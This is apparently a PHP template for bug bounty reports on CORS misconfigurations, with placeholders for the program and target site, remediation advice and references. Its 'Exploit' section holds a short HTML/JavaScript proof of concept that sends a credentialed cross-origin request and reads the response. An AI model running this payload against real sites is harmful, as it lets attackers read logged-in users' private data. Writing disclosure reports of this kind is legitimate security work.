Cross-origin resource sharing misconfiguration

===============================================

**H**ello <?php echo $program; ?> team,

##Description##

The following host suffer to a CORS (Cross Origin Resource Sharing) misconfiguration.
 <?php echo $website; ?>

``An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers``

##POC##

**Request**

**Response**

Take note from request I inject a header ``Origin: <?php echo $website; ?>`` then from response it returns ``Access-Control-Allow-Origin: <?php echo $website; ?>``. Which mean there is CORS misconfig here.

##Exploit##

<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','<?php echo $website; ?>',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>

##Remediation##

Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.



##Refrences##

https://hackerone.com/reports/235200
https://www.owasp.org/index.php/CORS_OriginHeaderScrutiny
http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html
https://www.cynet.com/wp-content/uploads/2016/12/Blog-Post-BugSec-Cynet-Facebook-Originull.pdf

Best regards,
Thanks for your time .
@khaledibnalwalid

---impact---

Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server